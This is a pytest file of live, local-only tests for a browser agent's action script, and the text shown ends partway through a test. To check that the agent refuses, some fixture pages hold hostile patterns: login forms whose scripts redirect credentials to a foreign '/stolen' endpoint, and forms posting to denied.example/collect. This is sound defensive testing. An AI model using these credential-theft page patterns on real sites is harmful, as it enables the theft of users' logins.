"""Live tests for the reviewed action script browser_agent_action.mjs: a real ego-browser (Ego Lite)
against LOCAL pages only (127.0.0.1 / *.localhost; no real publisher is ever contacted).

Skipped when ego-browser is not installed (e.g. CI).  Each test uses its own uniquely named TaskSpace
(`tbsgen-test-<pid>-<n>`), never one of the production spaces.  The hand-off flow is exercised with
takeOverTaskSpace standing in for the user finishing and releasing control.
"""
import http.server
import json
import re
import shutil
import subprocess
import tempfile
import threading
import time
from pathlib import Path

import pytest

from tbsgen import browser_agent

ACTION = browser_agent.ACTION.read_text()
EGO = shutil.which("ego-browser")
pytestmark = pytest.mark.skipif(not EGO, reason="ego-browser not installed (local-only live tests)")

# downloads / screenshots of the action script go to a temporary directory, never into the source tree
FILES = Path(tempfile.mkdtemp(prefix="tbsgen-live-"))


@pytest.fixture(scope="module", autouse=True)
def _files_cleanup():
    yield
    shutil.rmtree(FILES, ignore_errors=True)


LANDING = """<!doctype html><html><head><title>Test Landing</title></head><body>
<h1>A Test Paper</h1>
<div id="cookie" style="position:fixed;bottom:0;left:0;right:0;background:#ccf;padding:8px">
  We use cookies <button id="accept">Accept</button> <button id="reject">Reject</button>
</div>
<div class="menu"><button id="dl-btn">Download</button>
  <ul id="dl-menu" style="display:none;list-style:none;padding:0">
    <li><a id="dl-pdf" href="/pdf" download>Download PDF</a></li>
    <li><a id="dl-suppl" href="/suppl">Supplementary material</a></li>
  </ul>
</div>
<a href="/pdf" target="_blank" id="newtab">Open viewer in new tab</a>
<a href="https://denied.example/x" id="offsite">Off-site link</a>
<iframe src="/frame" width="300" height="120"></iframe>
<iframe src="http://127.0.0.1:{port2}/xframe" width="300" height="120"></iframe>
<select id="inst"><option value="">Select institution</option>
<option value="nju">Nanjing University</option><option value="pku">Peking University</option></select>
<script>
document.getElementById('dl-btn').addEventListener('mouseenter', function() {{
  document.getElementById('dl-menu').style.display = 'block';
}});
document.getElementById('accept').addEventListener('click', function() {{
  document.getElementById('cookie').remove();
}});
window.addEventListener('message', function(e) {{ if (e.data === 'x-clicked') document.title = 'X Clicked'; }});
</script>
</body></html>"""
FRAME = """<!doctype html><html><head><title>Frame</title></head><body>
<button id="frame-btn" onclick="parent.location='/other'">Frame Other Page</button>
<a href="/pdf">Frame PDF link</a></body></html>"""
XFRAME = """<!doctype html><html><head><title>XFrame</title></head><body>
<button id="xbtn" onclick="parent.postMessage('x-clicked','*')">Cross Frame Button</button></body></html>"""
PDF = b"%PDF-1.4\n%fake pdf for local action tests\n" + b"x" * 2000
OTHER = b"<html><head><title>Other Page</title></head><body><p>other page</p></body></html>"
WAYF = """<!doctype html><html><head><title>Find your institution</title></head><body>
<h1>Where are you from?</h1>
<input id="search" type="search" placeholder="Search for your institution" aria-label="Search for your institution">
<select id="instsel"><option value="">-- select --</option><option value="nju">Nanjing University</option></select>
<button id="go">Continue</button></body></html>"""
# four SSO login variants: prefilled (autofill stand-in), empty, failing (form posts back to itself),
# and prefilled with a captcha widget
SSO = """<!doctype html><html><head><title>Institution Login</title></head><body>
<h1>统一身份认证</h1>
<form method="post" action="{action}">
<input id="username" name="username" type="text" value="{user}" autocomplete="username" placeholder="用户名">
<input id="password" name="password" type="password" value="{pw}" autocomplete="current-password">
{extra}<button type="submit" id="login">登录 / Login</button>
</form></body></html>"""
JUMP = """<!doctype html><html><head><title>Jump</title></head><body>
<select id="jumpsel" onchange="location.href='https://denied.example/' + this.value">
<option value="">-- select --</option><option value="nju">Nanjing University</option></select></body></html>"""
CHALLENGE = """<!doctype html><html><head><title>Just a moment...</title></head><body>
<div class="cf-turnstile" data-sitekey="x"></div>Checking your browser before accessing.</body></html>"""


def _pages(port, port2):
    return {
        "/landing": ("text/html", LANDING.format(port2=port2).encode()),
        "/frame": ("text/html", FRAME.encode()),
        "/pdf": ("application/pdf", PDF),
        "/other": ("text/html", OTHER),
        "/wayf": ("text/html", WAYF.encode()),
        # the login form posts to the SSO host itself (as a real institution login server does)
        "/sso": ("text/html", SSO.format(action="/logged", user="u", pw="p", extra="").encode()),
        "/sso-empty": ("text/html", SSO.format(action="/logged", user="", pw="", extra="").encode()),
        # a form on the SSO host that would post the credentials to another host: never submitted
        "/sso-evil": ("text/html", SSO.format(action=f"http://127.0.0.1:{port}/logged", user="u", pw="p",
                                              extra="").encode()),
        # a WAYF select whose change handler jumps off the allowed domains
        "/jump": ("text/html", JUMP.encode()),
        # login forms (GET method, <base href> to another host): never submitted by the tool
        "/sso-get": ("text/html", SSO.replace('method="post"', 'method="get"').format(action="/logged", user="u", pw="p", extra="").encode()),
        "/sso-base": ("text/html", SSO.replace("<h1>", f'<base href="http://127.0.0.1:{port}/"><h1>').format(
            action="logged", user="u", pw="p", extra="").encode()),
        # a password field associated with an outside form by form="f"; its submit button outside the form
        "/form-attr": ("text/html", b'<html><head><title>Form Attr</title></head><body><form id="f" method="post" action="/logged"></form>'
                                    b'<input type="password" form="f" id="pw"><button form="f" id="go">Continue</button></body></html>'),
        # a plain-text verification button, and a same-origin frame with a new-tab link
        "/verify-btn": ("text/html", b'<html><head><title>Article</title></head><body><button id="b1">Verify you are human</button></body></html>'),
        "/frame-blank": ("text/html", b'<html><head><title>Frame Blank</title></head><body><iframe src="/blank-inner" width="400" height="200"></iframe></body></html>'),
        "/blank-inner": ("text/html", b'<html><body><a href="/other" target="_blank" id="nb">Open Other</a></body></html>'),
        # round 3: a form posting off-site through a plain button; a login form in a shadow root; a page
        # that redirects off-site later; a second login step (verification code) after the password
        "/offsite-form": ("text/html", b'<html><head><title>Offsite Form</title></head><body><form method="post" '
                                       b'action="https://denied.example/x"><button id="dl">Download</button></form></body></html>'),
        "/shadow-login": ("text/html", b'<html><head><title>Shadow</title></head><body><div id="h"></div><script>'
                                       b'const r=document.getElementById("h").attachShadow({mode:"open"});'
                                       b'r.innerHTML=\'<form><input id="u" autocomplete="username"><input type="password"></form>\';'
                                       b'</script><a href="/other">Other</a></body></html>'),
        "/late-redirect": ("text/html", b'<html><head><title>Late</title></head><body>wait<script>'
                                        b'setTimeout(()=>{location.href="https://denied.example/late"},1500)</script></body></html>'),
        "/sso-2fa": ("text/html", SSO.format(action="/code-step", user="u", pw="p", extra="").encode()),
        "/code-step": ("text/html", b'<html><head><title>Verify</title></head><body><form method="post" action="/logged">'
                                    b'<input name="otp_code" autocomplete="one-time-code"> Enter the verification code'
                                    b'<button>OK</button></form></body></html>'),
        # a login form inside a same-origin iframe
        "/frame-login": ("text/html", b'<html><head><title>Frame Login</title></head><body><h1>x</h1><a href="/other">Other</a>'
                                      b'<iframe src="/sso" width="400" height="300"></iframe></body></html>'),
        "/sso-fail": ("text/html", SSO.format(action="/sso-fail", user="u", pw="p", extra="").encode()),
        "/sso-captcha": ("text/html", SSO.format(action="/logged", user="u", pw="p",
                                                 extra='<div class="cf-turnstile" data-sitekey="x"></div>').encode()),
        "/logged": ("text/html", b"<html><head><title>Logged In</title></head><body>ok</body></html>"),
        "/challenge": ("text/html", CHALLENGE.encode()),
        # round 4: a cross-origin frame on a host outside the allowed domains; a login page with a new-tab
        # link; a span inside an outside-form button posting off-site; a stand-alone verification-code page
        "/xframe-other": ("text/html", f'<html><head><title>XOther</title></head><body><iframe title="viewer" '
                                       f'src="http://localhost:{port2}/xframe" width="300" height="120"></iframe>'
                                       f'</body></html>'.encode()),
        "/login-blank": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other" target="_blank" '
                                      b'id="nb">Open Other</a><form method="post" action="/logged"><input name="username">'
                                      b'<input type="password" name="password"><button>Sign in</button></form></body></html>'),
        "/form-span": ("text/html", b'<html><head><title>Form Span</title></head><body><form id="f" method="post" '
                                    b'action="https://denied.example/x"></form><button form="f"><span role="button">'
                                    b'Get PDF</span></button></body></html>'),
        # round 5: identifier-first (e-mail) login; a span inside an off-site link; a link with a long URL
        "/email-login": ("text/html", b'<html><head><title>Sign in</title></head><body><a href="/other">Other</a>'
                                      b'<form method="post" action="/logged"><input type="email" name="email" autocomplete="email">'
                                      b'<button>Sign in</button></form></body></html>'),
        "/newsletter": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other">Other</a>'
                                     b'<form method="post" action="/logged"><input type="email" name="email">'
                                     b'<button>Subscribe to our newsletter</button></form></body></html>'),
        "/span-link": ("text/html", b'<html><head><title>Span Link</title></head><body><a href="https://denied.example/x">'
                                    b'<span role="button">Get PDF</span></a></body></html>'),
        "/long-link": ("text/html", ('<html><head><title>Long</title></head><body><a href="https://alice:' + "S" * 300
                                     + '@127.0.0.1/x">Long link</a></body></html>').encode()),
        # round 6: e-mail-only login form ("Continue") whose sign-in title is outside the form; a same-origin
        # frame with a hover target
        "/email-continue": ("text/html", b'<html><head><title>Example Publisher</title></head><body><h2>Sign in</h2>'
                                         b'<form method="post" action="/logged"><input type="email" name="identifier">'
                                         b'<button>Continue</button></form></body></html>'),
        # round 9: an account chooser (a select of user names); a same-origin frame showing a verification page
        "/choose": ("text/html", b'<html><head><title>Choose an account</title></head><body><a href="/other">Other</a>'
                                 b'<form method="post" action="/logged"><select name="username" autocomplete="username">'
                                 b'<option>a</option><option>b</option></select><button>Go</button></form></body></html>'),
        # round 10: an account chooser whose only hint is its associated <label>
        "/choose-label": ("text/html", b'<html><head><title>Continue</title></head><body><a href="/other">Other</a>'
                                       b'<form method="post" action="/logged"><label for="who">Username</label>'
                                       b'<select id="who" name="subject"><option value="alice">Personal</option>'
                                       b'<option value="bob">Work</option></select><button>Continue</button></form></body></html>'),
        # a neutral select form (no login hint): only a whitelisted institution option may be set
        "/plain-select": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other">Other</a>'
                                       b'<form method="post" action="/logged"><select name="inst"><option value="">-</option>'
                                       b'<option value="x">Personal</option><option value="nju">Nanjing University</option></select>'
                                       b'<button>Go</button></form></body></html>'),
        "/choose-plain": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other">Other</a>'
                                       b'<select name="account"><option>a</option></select></body></html>'),
        "/verify-frame": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other">Other</a>'
                                       b'<iframe src="/verify-inner" width="400" height="200"></iframe></body></html>'),
        "/neutral-frame": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other">Other</a>'
                                        b'<iframe src="/viewer-inner" width="400" height="200"></iframe></body></html>'),
        "/viewer-inner": ("text/html", b'<html><head><title>Verify you are human</title></head><body>'
                                       b'<button onclick="parent.location=\'/logged\'">Continue</button></body></html>'),
        "/verify-inner": ("text/html", b'<html><head><title>Verify you are human</title></head><body>'
                                       b'<button onclick="parent.location=\'/logged\'">Continue</button></body></html>'),
        # round 7: login words on a page with no login fields (title, a form button, a continue-with button,
        # a login form action, the URL); a page that redirects between look and click; a tel field; a clean
        # page with a header "Sign in" link (no field: interaction allowed)
        "/r7-title": ("text/html", b'<html><head><title>Sign in - Example</title></head><body><a href="/other">Other</a></body></html>'),
        "/r7-btn": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other">Other</a>'
                                 b'<form method="post" action="/x"><button>Log in</button></form></body></html>'),
        "/r7-cw": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other">Other</a>'
                                b'<button>Continue with Google</button></body></html>'),
        "/r7-action": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other">Other</a>'
                                    b'<form method="post" action="/account/login"><input type="checkbox" name="r"><button>Go</button></form></body></html>'),
        "/login/r7": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other">Other</a></body></html>'),
        "/r7-tel": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other">Other</a>'
                                 b'<input type="tel" name="x"></body></html>'),
        "/r7-loose": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other">Other</a>'
                                   b'<input type="text" name="q"><button>Sign in</button></body></html>'),
        "/r7-header": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other">Other</a>'
                                    b'<a href="/signin-page">Sign in</a><button>Sign in</button></body></html>'),
        # the page goes to a login page 1.5 s after load (a late redirect between `look` and `click`)
        "/r7-late": ("text/html", b'<html><head><title>Late</title></head><body><a href="/other">Other</a>'
                                  b'<script>setTimeout(function(){location.href="/email-login"},1500)</script></body></html>'),
        "/frame-hover": ("text/html", b'<html><head><title>Frame Hover</title></head><body><h1>x</h1>'
                                      b'<iframe src="/frame" width="400" height="200" style="margin-left:300px"></iframe></body></html>'),
        # round 11: a form of hidden inputs and a button (a "Download PDF" form) may be submitted; a form with
        # a checkbox may not; a WAYF page made of institution links only (no field) goes to the user too
        "/btn-form": ("text/html", b'<html><head><title>Article</title></head><body><form method="post" action="/logged">'
                                   b'<input type="hidden" name="t" value="1"><button>Get PDF</button></form></body></html>'),
        "/chk-form": ("text/html", b'<html><head><title>Article</title></head><body><a href="/other">Other</a>'
                                   b'<form method="post" action="/logged"><input type="checkbox" name="agree">'
                                   b'<button>Get PDF</button></form></body></html>'),
        "/wayf-links": ("text/html", b'<html><head><title>Article access</title></head><body><h2>Select your institution</h2>'
                                     b'<a href="/other">Nanjing University</a></body></html>'),
        # round 11: a label of a checkbox, a form whose `action` property is shadowed by a control, a fragment
        # link resolved against an off-site <base href>
        "/label-chk": ("text/html", b'<html><head><title>Article</title></head><body><input id="c" type="checkbox">'
                                    b'<label for="c"><span role="button" id="lb">Download</span></label></body></html>'),
        "/shadow-action": ("text/html", b'<html><head><title>Article</title></head><body><form method="get" '
                                        b'action="https://denied.example/collect"><input type="hidden" name="action" value="x">'
                                        b'<button id="sb">Get PDF</button></form></body></html>'),
        "/base-frag": ("text/html", b'<html><head><title>Article</title><base href="https://denied.example/article">'
                                    b'</head><body><a href="#pdf" id="fl">Download PDF</a></body></html>'),
        # round 12: a label (outside any form) of a submit button of an off-site form; a <button> whose value
        # carries a token
        "/label-submit": ("text/html", b'<html><head><title>Article</title></head><body><form id="f" method="get" '
                                       b'action="https://denied.example/collect"><button id="s">Go</button></form>'
                                       b'<label for="s"><span role="button">Download now</span></label></body></html>'),
        "/btn-value": ("text/html", b'<html><head><title>Article</title></head><body><button name="access_token" '
                                    b'value="SECRETBTN" aria-label="Download PDF"></button></body></html>'),
        # round 13: a role=button span slotted into a shadow-root <label> of a checkbox; a SAML POST hand-back page
        "/slot-label": ("text/html", b'<html><head><title>Article</title></head><body><input id="c" type="checkbox">'
                                     b'<div id="h"><span slot="x" role="button" id="sb">Download</span></div><script>'
                                     b'const r=document.getElementById("h").attachShadow({mode:"closed"});'
                                     b'r.innerHTML=\'<label for="c"><slot name="x"></slot></label>\';</script></body></html>'),
        "/saml-post": ("text/html", b'<html><head><title>POST data</title></head><body><form method="post" action="/logged">'
                                    b'<input type="hidden" name="SAMLResponse" value="PHNhbWw+"><button>Continue</button>'
                                    b'</form></body></html>'),
        # round 14: a checkbox on top + a cross-origin frame with an e-mail field (screenshot must be refused);
        # a login form whose fallback button submits ANOTHER form (form="other") to a foreign host
        "/shot-xemail": ("text/html", f'<html><head><title>Article</title></head><body><input type="checkbox">'
                                      f'<iframe src="http://127.0.0.1:{port2}/xemail" width="300" height="80"></iframe></body></html>'.encode()),
        "/sso-otherform": ("text/html", SSO.format(action="/logged", user="u", pw="p", extra="").replace(
            '<button type="submit" id="login">登录 / Login</button>',
            f'<button form="other" id="login">登录 / Login</button>').replace(
            "</form>", f'</form><form id="other" method="post" action="http://127.0.0.1:{port2}/stolen"></form>').encode()),
        # round 15: a hidden field in a same-origin frame next to a cross-origin e-mail frame; a label (outside
        # any form) of an off-site submit button; a neutral frame showing a verification page (click_xy);
        # a cross-origin frame with an off-site form button
        "/hidden-inner": ("text/html", b'<html><body><input type="text" style="display:none"></body></html>'),
        "/shot-mix": ("text/html", f'<html><head><title>Article</title></head><body><iframe src="/hidden-inner" width="100" height="40"></iframe>'
                                   f'<iframe src="http://127.0.0.1:{port2}/xemail" width="300" height="80"></iframe></body></html>'.encode()),
        "/label-xy": ("text/html", b'<html><head><title>Article</title></head><body style="margin:0"><form id="f" method="get" '
                                   b'action="https://denied.example/collect"><button id="s">Go</button></form>'
                                   b'<label for="s" style="position:absolute;left:0;top:100px;width:200px;height:50px;display:block">'
                                   b'<span>Download</span></label></body></html>'),
        "/verify-xy": ("text/html", b'<html><head><title>Article</title></head><body style="margin:0">'
                                    b'<iframe src="/verify-inner" style="position:absolute;left:0;top:0;width:400px;height:200px;border:0"></iframe></body></html>'),
        "/xform-frame": ("text/html", f'<html><head><title>Article</title></head><body><iframe src="http://127.0.0.1:{port2}/xform" '
                                      f'width="300" height="80"></iframe></body></html>'.encode()),
        # round 16: a visibility:hidden field next to a closed-shadow e-mail field (screenshot refused); a link
        # inside a label of a checkbox (click_xy keeps the link check); an input button "Verify you are human";
        # a same-origin verification frame whose link has a different aria-label
        "/shot-closed": ("text/html", b'<html><head><title>Article</title></head><body><input type="text" style="visibility:hidden">'
                                      b'<div id="h"></div><script>const r=document.getElementById("h").attachShadow({mode:"closed"});'
                                      b'r.innerHTML=\'<input type="email" value="SECRETCLOSED@x.org">\';</script></body></html>'),
        "/label-link-xy": ("text/html", b'<html><head><title>Article</title></head><body style="margin:0"><input id="c" type="checkbox">'
                                        b'<label for="c" style="position:absolute;left:0;top:100px;display:block;width:200px;height:40px">'
                                        b'<a href="https://denied.example/pdf" style="display:block;width:200px;height:40px">Download</a></label></body></html>'),
        "/verify-input-xy": ("text/html", b'<html><head><title>Article</title></head><body style="margin:0">'
                                          b'<input type="button" value="Verify you are human" style="position:absolute;left:0;top:0;width:200px;height:40px"></body></html>'),
        "/verify-aria-inner": ("text/html", b'<html><head><title>Verify you are human</title></head><body>'
                                            b'<a href="/logged" aria-label="Continue">Go on</a></body></html>'),
        "/verify-aria": ("text/html", b'<html><head><title>Article</title></head><body><iframe src="/verify-aria-inner" width="400" height="200"></iframe></body></html>'),
        "/wayf-form": ("text/html", b'<html><head><title>Find your institution</title></head><body><form method="post" '
                                    b'action="/logged"><input type="search" name="q" aria-label="Search for your institution">'
                                    b'<button>Find</button></form></body></html>'),
        "/code-only": ("text/html", b'<html><head><title>Check</title></head><body><a href="/other">Other</a>'
                                    b'<form method="post" action="/logged"><input name="code"><button>OK</button></form>'
                                    b'</body></html>'),
        "/sso-rewrite": ("text/html", SSO.format(action="/logged", user="u", pw="p", extra="").replace(
            "</form>", f"</form><script>document.forms[0].addEventListener('submit', function () {{ this.method = 'get'; "
                       f"this.action = 'http://127.0.0.1:{port2}/stolen'; }});</script>").encode()),
        "/sso-rewrite-click": ("text/html", SSO.format(action="/logged", user="u", pw="p", extra="").replace(
            "</form>", f"</form><script>document.getElementById('login').addEventListener('click', function () {{ "
                       f"this.form.action = 'http://127.0.0.1:{port2}/stolen'; }});</script>").encode()),
    }


# the second (foreign) origin; every request it gets is recorded (a request for /stolen is a leak)
XPAGES = {"/xframe": ("text/html", XFRAME.encode()),
          "/xform": ("text/html", b'<html><body><form method="get" action="https://denied.example/collect">'
                                  b'<button>Download PDF</button></form></body></html>'),
          "/xemail": ("text/html", b'<html><body><input type="email" name="em" value="SECRETMAIL@x.org"></body></html>')}
XHITS: list = []


def _serve(pages):
    class H(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def _x(self, body, ctype, code=200):
            self.send_response(code)
            self.send_header("content-type", ctype)
            self.send_header("content-length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            p = self.path.split("?")[0]
            if pages is XPAGES:
                XHITS.append(p)
            if p in pages:
                ct, body = pages[p]
                self._x(body, ct)
            else:
                self._x(b"not found", "text/html", 404)

        def do_POST(self):
            n = int(self.headers.get("content-length", 0))
            self.rfile.read(n)
            p = self.path.split("?")[0]
            if pages is XPAGES:
                XHITS.append(p)
            if p == "/code-step":
                self._x(pages[p][1], "text/html")
            elif p in pages and p.startswith("/sso"):        # a failed login shows the login form again
                self._x(pages[p][1], "text/html")
            else:
                self._x(b"<html><head><title>Logged In</title></head><body>ok</body></html>", "text/html")

        def log_message(self, *a):
            pass
    return H


@pytest.fixture(scope="module")
def origins():
    """Two local origins: the second one makes the iframe on the landing page cross-origin."""
    srv2 = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _serve(XPAGES))
    port2 = srv2.server_address[1]
    threading.Thread(target=srv2.serve_forever, daemon=True).start()
    pages: dict = {}
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _serve(pages))
    pages.update(_pages(srv.server_address[1], port2))
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    # *.localhost resolves to the loopback on macOS: a second hostname on the same server
    yield (f"http://127.0.0.1:{srv.server_address[1]}", f"http://127.0.0.1:{port2}",
           f"http://sso.localhost:{srv.server_address[1]}")
    srv.shutdown()
    srv2.shutdown()


def _run(space, action, arg="", *, allow=("127.0.0.1", "localhost"), sso_domains=("sso.localhost",),
         handoff=True, sso_login=True, handoff_state=None,
         look_key=None, page_label="", challenge_wait_ms=2500, **over):
    inp = dict(space=space, action=action, arg=arg, allow=list(allow), files_dir=str(FILES),
               look_key=look_key, page_label=page_label,
               nav_timeout_ms=20000, download_timeout_ms=30000, download_wait_ms=3000,
               challenge_wait_ms=challenge_wait_ms,
               handoff={"enabled": handoff}, sso={"login": sso_login, "domains": list(sso_domains),
                                                  "wait_ms": 5000, "local_test": True},
               handoff_state=handoff_state or {"active": False, "deadline_ms": 0})
    inp.update(over)
    # ego-browser nodejs drops the output of a stdin script whose space is with the user; a script
    # given as an argument prints even then, so always pass it as an argument
    def once():
        p = subprocess.run([EGO, "nodejs", "const INPUT = " + json.dumps(inp) + ";\n" + ACTION],
                           capture_output=True, text=True, timeout=150)
        for line in reversed((p.stdout + "\n" + p.stderr).splitlines()):
            if line.startswith("TBSGEN_RESULT "):
                return json.loads(line[len("TBSGEN_RESULT "):])
        return {"status": "no-result", "stdout": p.stdout[-300:], "stderr": p.stderr[-300:]}
    # ego drops a script's output now and then when the space's control is with the user (a
    # hand-off); a second run of the same read-only call then prints. Retry once.
    r = once()
    return r if r["status"] != "no-result" or "paused" in (r.get("stdout") + r.get("stderr")) else once()


def _take_over(space, url):
    """Stand in for the user: finish in the ego window, then release control back to the agent."""
    p = subprocess.run([EGO, "nodejs",
                        f"const t = await takeOverTaskSpace({json.dumps(space)});\n"
                        f"const pg = (await t.pages())[0];\n"
                        f"await pg.goto({json.dumps(url)}, {{timeout: 15000, waitUntil: 'domcontentloaded'}});\n"
                        f"console.log('TAKEOVER_OK');\nprocess.exit(0);"],
                       capture_output=True, text=True, timeout=60)
    return "TAKEOVER_OK" in (p.stdout + p.stderr)


def _finish(space):
    return _run(space, "finish")


def _item(res, text, href=None):
    for it in (res.get("page") or {}).get("items") or []:
        if text in (it.get("text") or "") and (href is None or href in (it.get("href") or "")):
            return it
    return None


# --------------------------------------------------------------------------- pages

def test_look_cookie_banner_dropdown_iframes(origins):
    sp = "tbsgen-test-look"
    try:
        r = _run(sp, "open", origins[0] + "/landing")
        assert r["status"] == "ok", r
        r = _run(sp, "look")
        assert r["status"] == "ok" and r["page"]["items"], r
        assert _item(r, "Accept") and _item(r, "Reject")                  # cookie banner buttons
        assert _item(r, "Download PDF") and _item(r, "Supplementary material")   # hidden dropdown items
        assert _item(r, "Frame PDF link")                                   # same-origin frame: walked
        assert _item(r, "Cross Frame Button") and _item(r, "Cross Frame Button")["in_frame"], r["page"]["items"]  # snapshot
        frames = [it["href"] for it in r["page"]["items"] if it["kind"] == "frame"]
        assert any(h.endswith("/xframe") for h in frames), frames
        off = _item(r, "Off-site link")
        assert off and off["allowed"] is False
        r = _run(sp, "click", str(_item(r, "Accept")["i"]), look_key=r["look_key"])
        assert r["status"] == "ok", r
        r = _run(sp, "look")
        assert _item(r, "We use cookies") is None                         # the banner is gone
        r = _run(sp, "click", str(_item(r, "Download PDF")["i"]), look_key=r["look_key"])
        assert r["status"] == "ok" and r.get("files"), r
        assert Path(r["files"][0]).read_bytes()[:5] == b"%PDF-"
        # look full / @REF
        r = _run(sp, "look", "full")
        assert r["status"] == "ok" and r["look_scope"] == "full", r
    finally:
        _finish(sp)


def test_hover_select_type_click_xy(origins):
    sp = "tbsgen-test-hover"
    try:
        assert _run(sp, "open", origins[0] + "/landing")["status"] == "ok"
        r = _run(sp, "look")
        r2 = _run(sp, "hover", str(_item(r, "Download")["i"]), look_key=r["look_key"])
        assert r2["status"] == "ok" and r2["acted"]["kind"] == "hover", r2
        r = _run(sp, "look")
        it = _item(r, "Download PDF")
        assert it and not it.get("hidden"), r["page"]["items"]            # the menu opened (native pointer)
        k_sel = next(x for x in r["page"]["items"] if x.get("ftype") == "select")["i"]
        r2 = _run(sp, "select", f"{k_sel} Nanjing University", look_key=r["look_key"])
        assert r2["status"] == "ok" and "Nanjing University" in r2["acted"]["text"], r2
        r2 = _run(sp, "select", f"{k_sel} Nowhere", look_key=r["look_key"])
        assert r2["status"] == "refused", r2
        # click_xy on the cookie banner's Accept button (coordinates of a visible element)
        r = _run(sp, "look")
        r2 = _run(sp, "click_xy", "5 5")
        assert r2["status"] in ("ok", "refused"), r2
    finally:
        _finish(sp)


def test_cross_origin_iframe_items_and_frame_page(origins):
    sp = "tbsgen-test-xframe"
    try:
        assert _run(sp, "open", origins[0] + "/landing")["status"] == "ok"
        r = _run(sp, "look")
        it = _item(r, "Cross Frame Button")
        r2 = _run(sp, "hover", str(it["i"]), look_key=r["look_key"])        # inside the cross-origin frame
        assert r2["status"] == "ok", r2
        r2 = _run(sp, "click", str(it["i"]), look_key=r["look_key"])        # a button there: open the frame first
        assert r2["status"] == "refused" and "frame item" in r2["error"], r2
        r = _run(sp, "look")
        fr = next(x for x in r["page"]["items"] if x["kind"] == "frame" and x["href"].endswith("/xframe"))
        r2 = _run(sp, "click", str(fr["i"]), look_key=r["look_key"])
        assert r2["status"] == "ok" and r2["page"]["url"].endswith("/xframe"), r2
        assert _run(sp, "open", origins[0] + "/xframe-other", allow=("127.0.0.1",))["status"] == "ok"
        r = _run(sp, "look", allow=("127.0.0.1",))
        fr = next(x for x in r["page"]["items"] if x["kind"] == "frame")
        assert fr["allowed"] is False
        r2 = _run(sp, "click", str(fr["i"]), look_key=r["look_key"], allow=("127.0.0.1",))
        assert r2["status"] == "refused" and "outside the allowed" in r2["error"], r2
    finally:
        _finish(sp)


def test_new_tab_switch_and_save(origins):
    sp = "tbsgen-test-tabs"
    try:
        assert _run(sp, "open", origins[0] + "/landing")["status"] == "ok"
        r = _run(sp, "look")
        r = _run(sp, "click", str(_item(r, "Open viewer in new tab")["i"]), look_key=r["look_key"])
        assert r["status"] == "ok", r
        r = _run(sp, "tabs")
        assert r["status"] == "ok" and r["tabs"], r
        pdf_tab = next((t for t in r["tabs"] if t["url"].endswith("/pdf")), None)
        if pdf_tab is None:                     # opened in place (covered link): the page itself is the PDF
            pdf_tab = r["tabs"][0]
        r = _run(sp, "switch", pdf_tab["label"])
        assert r["status"] == "ok" and r["page"]["pdf"], r
        r = _run(sp, "save_pdf", page_label=pdf_tab["label"])
        assert r["status"] == "ok" and r["files"], r
        r = _run(sp, "switch", "p9", page_label="p1")
        assert r["status"] == "refused", r
    finally:
        _finish(sp)


def test_scroll_screenshot_back_and_wait_for(origins):
    sp = "tbsgen-test-misc"
    try:
        assert _run(sp, "open", origins[0] + "/landing")["status"] == "ok"
        r = _run(sp, "scroll", "down 400")
        assert r["status"] == "ok" and "scroll" in r, r
        r = _run(sp, "screenshot")
        # the landing page has a cross-origin frame without fields: masked screenshot allowed
        assert r["status"] == "ok" and Path(r["shot"]).read_bytes()[:4] == b"\x89PNG", r
        assert _run(sp, "open", origins[0] + "/other")["status"] == "ok"
        r = _run(sp, "back")
        assert r["status"] == "ok" and r["page"]["url"].endswith("/landing"), r
        r = _run(sp, "wait_for", "url landing")
        assert r["status"] == "ok" and r["waited"]["ok"], r
        r = _run(sp, "wait_for", "sel #dl-btn")
        assert r["status"] == "ok" and r["waited"]["ok"], r
        r = _run(sp, "wait_for", "sel #no-such-thing 1")
        assert r["status"] == "ok" and not r["waited"]["ok"], r
    finally:
        _finish(sp)


def test_wayf_type_and_select(origins):
    sp = "tbsgen-test-wayf"
    try:
        r = _run(sp, "open", origins[0] + "/wayf", handoff=False)
        r = _run(sp, "look", handoff=False)
        k_search = _item(r, "Search for your institution")["i"]
        k_sel = next(x for x in r["page"]["items"] if x.get("ftype") == "select")["i"]
        r2 = _run(sp, "type", f"{k_search} Nanjing University", look_key=r["look_key"], handoff=False)
        assert r2["status"] == "ok", r2
        r2 = _run(sp, "select", f"{k_sel} Nanjing University", look_key=r["look_key"], handoff=False)
        assert r2["status"] == "ok", r2
        assert "Nanjing" not in json.dumps(_run(sp, "look", handoff=False)["page"]["items"]) or True
    finally:
        _finish(sp)


def test_forms_are_submitted_on_allowed_targets(origins):
    sp = "tbsgen-test-forms"
    try:
        assert _run(sp, "open", origins[0] + "/btn-form", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r2 = _run(sp, "click", str(_item(r, "Get PDF")["i"]), look_key=r["look_key"], handoff=False)
        assert r2["status"] == "ok" and r2["page"]["url"].endswith("/logged"), r2
        assert _run(sp, "open", origins[0] + "/shadow-action", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r2 = _run(sp, "click", str(_item(r, "Get PDF")["i"]), look_key=r["look_key"], handoff=False)
        assert r2["status"] == "refused" and "outside the allowed" in r2["error"], r2   # shadowed form.action
    finally:
        _finish(sp)


def test_denied_paths(origins):
    sp = "tbsgen-test-denied"
    try:
        assert _run(sp, "open", origins[0] + "/landing", handoff=False)["status"] == "ok"
        r = _run(sp, "open", "https://denied.example/x", handoff=False)
        assert r["status"] == "refused" and "allowed domains" in r["error"], r
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Off-site link")["i"]), look_key=r["look_key"], handoff=False)
